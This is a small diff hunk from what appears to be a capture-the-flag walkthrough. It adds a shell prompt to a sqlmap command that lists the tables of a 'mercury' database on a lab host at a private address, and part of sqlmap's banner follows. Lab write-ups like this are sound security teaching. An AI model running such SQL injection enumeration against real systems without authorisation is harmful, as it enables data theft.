@@ -98,7 +98,7 @@ available databases [2]:
 Here we go, let's grab the tables now.
 
 ```
-sqlmap -u http://192.168.1.19:8080/mercuryfacts/ -D mercury --tables --batch
+$ sqlmap -u http://192.168.1.19:8080/mercuryfacts/ -D mercury --tables --batch
         ___
        __H__
  ___ ___[,]_____ ___ ___  {1.4.5#stable}
